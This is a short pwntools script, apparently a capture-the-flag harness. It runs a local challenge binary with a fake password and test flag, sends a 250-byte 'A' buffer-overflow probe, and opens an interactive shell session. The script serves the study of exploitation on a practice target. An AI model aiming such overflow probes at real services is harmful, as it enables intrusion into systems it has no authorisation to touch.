import pwn

# Setup fake ENV
env = {
    "PASSWORD": "poerwir932-09re",
    "FLAG": "MINUTEMAN{test-flag}"
}

p = pwn.process("./static/oppenheimers-research", env=env)
# host = "localhost"
# port = 4444
# p = remote(host, port)

p.sendline(b'A' * 250)
p.interactive()